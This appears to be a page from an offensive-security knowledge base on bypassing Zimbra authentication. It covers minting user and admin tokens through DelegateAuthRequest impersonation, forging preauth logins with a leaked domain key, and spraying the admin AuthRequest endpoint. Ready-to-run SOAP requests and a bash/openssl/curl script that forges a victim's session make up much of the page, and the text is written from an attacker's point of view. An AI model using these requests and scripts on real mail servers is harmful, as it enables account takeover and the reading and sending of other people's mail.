---
title: "Authentication bypass: minting and abusing Zimbra auth tokens"
description: "Obtaining a valid Zimbra token without the account password: admin-to-user impersonation through the SOAP DelegateAuthRequest with an admin token, the preauth mechanism and its domain preauth key, and the token-handling flaws that return a usable ZM_AUTH_TOKEN or ZM_ADMIN_AUTH_TOKEN from a crafted request. Worked SOAP envelopes with response interpretation."
keywords:
  - zimbra authentication bypass
  - delegateauthrequest
  - zm_admin_auth_token
  - zimbra preauth
  - admin impersonation
---

# Authentication bypass

Zimbra's whole authorization model rests on two cookies: `ZM_AUTH_TOKEN` for a user and `ZM_ADMIN_AUTH_TOKEN` for an administrator, both validated by mailboxd on every SOAP call. Anything that yields one of those tokens without the account's password is a full bypass. Three routes recur: legitimately delegating from an admin token down to any user (`DelegateAuthRequest`), forging a user token with a domain's **preauth** key, and the token-handling flaws where a crafted request to a privileged endpoint returns a usable token outright. The product of this page is a token; hand it to [RCE chains](rce-chains.md) or use it directly to read mail.

## Admin-to-user impersonation (DelegateAuthRequest)

An admin token is the master key: the admin SOAP `DelegateAuthRequest` asks mailboxd to issue a **user** `ZM_AUTH_TOKEN` for any named account, by design, so an administrator can act as a user. If you hold any `ZM_ADMIN_AUTH_TOKEN` (sprayed admin, or minted by a chain), you can log in to every mailbox without their passwords.

```http
POST /service/admin/soap HTTP/1.1
Host: target
Content-Type: application/soap+xml
Cookie: ZM_ADMIN_AUTH_TOKEN=<admin-token>

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Header>
    <context xmlns="urn:zimbra"><authToken><![CDATA[<admin-token>]]></authToken></context>
  </soap:Header>
  <soap:Body>
    <DelegateAuthRequest xmlns="urn:zimbraAdmin">
      <account by="name">victim@target</account>
    </DelegateAuthRequest>
  </soap:Body>
</soap:Envelope>
```

The response carries the delegated user token:

```xml
<DelegateAuthResponse>
  <authToken>0_abc...delegated...</authToken>
  <lifetime>3600000</lifetime>
</DelegateAuthResponse>
```

Set that value as `ZM_AUTH_TOKEN` against `/service/soap` and you are the victim: read, search, and send as them. This is the canonical post-admin step, and it is why minting an admin token (below, or via the ProxyServlet SSRF in [RCE chains](rce-chains.md)) is the objective.

## Preauth token forgery

Zimbra supports **preauth**: a domain holds a preauth key, and a URL to `/service/preauth` carrying an account, a timestamp, an expiry, and an HMAC of those values over the key logs the account in without a password. The mechanism is intended for single sign-on from a trusted portal. If the domain preauth key leaks (from a config read, a `GetDomainInfo`/`GetInfo` disclosure, or an earlier file read), you can forge a login for any account in that domain:

```bash
# preauth value = HMAC-SHA1( "account|by|expires|timestamp", preauth_key )
ts=$(date +%s000); exp=0
data="victim@target|name|$exp|$ts"
pa=$(printf '%s' "$data" | openssl dgst -sha1 -hmac "$PREAUTH_KEY" | awk '{print $2}')
curl -ski "https://target/service/preauth?account=victim@target&by=name&timestamp=$ts&expires=$exp&preauth=$pa"
```

A `Set-Cookie: ZM_AUTH_TOKEN=...` in the response is a valid session for the victim, no password involved. The entire strength of preauth is secrecy of the key, so any disclosure of it is a domain-wide account takeover primitive.

## Token-handling flaws (crafted request returns a token)

Several Zimbra flaws collapse the distinction between an unauthenticated request and a privileged one, returning or accepting a token that should never have been issued. The pattern: a request to a privileged endpoint is treated as pre-trusted because it arrives through an internal path, a proxied route, or a parser that mis-scopes the auth context. The most impactful version is reached by routing an unauthenticated request through the front end so that mailboxd sees it as an internal, implicitly trusted admin call, which returns an admin token. That routing is done with the ProxyServlet SSRF and the memcached route poisoning documented in [RCE chains](rce-chains.md); the result delivered back here is a `ZM_ADMIN_AUTH_TOKEN`, which then feeds `DelegateAuthRequest` above.

Where the admin SOAP `AuthRequest` itself is reachable without network restriction, a sprayed admin credential yields the admin token directly:

```http
POST /service/admin/soap HTTP/1.1
Host: target
Content-Type: application/soap+xml

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <AuthRequest xmlns="urn:zimbraAdmin">
      <name>admin@target</name><password>Sprayed1!</password>
    </AuthRequest>
  </soap:Body>
</soap:Envelope>
```

```xml
<AuthResponse><authToken>0_adminToken...</authToken><lifetime>43200000</lifetime></AuthResponse>
```

An `<authToken>` in an `AuthResponse` from the `urn:zimbraAdmin` namespace is an admin token; a `<soap:Fault>` means the credential or reachability failed.

## Exploitation notes

- The hierarchy is **admin token -> any user token**: `DelegateAuthRequest` is the pivot, so every chain aims at an admin token first.
- A user token (`ZM_AUTH_TOKEN`) is enough for full mailbox read and send-as for that account; an admin token (`ZM_ADMIN_AUTH_TOKEN`) is enough for every account and for server administration.
- Preauth forgery needs only the **domain preauth key**, not a per-account secret, so one key leak is domain-wide.
- Tokens are time-boxed by `lifetime`; re-mint rather than reuse a stale token, and note admin tokens are long-lived by default.

## Tools

- `openssl dgst -sha1 -hmac` for computing the preauth HMAC.
- Burp Suite / curl for replaying SOAP `AuthRequest` and `DelegateAuthRequest`.

## References

- [Zimbra: preauth SSO mechanism](https://wiki.zimbra.com/wiki/Preauth)
- [Zimbra admin SOAP (DelegateAuthRequest, AuthRequest)](https://wiki.zimbra.com/wiki/SOAP_API_Reference_Material_Beginning_with_ZCS_8.0)
- [Zimbra security advisories](https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories)
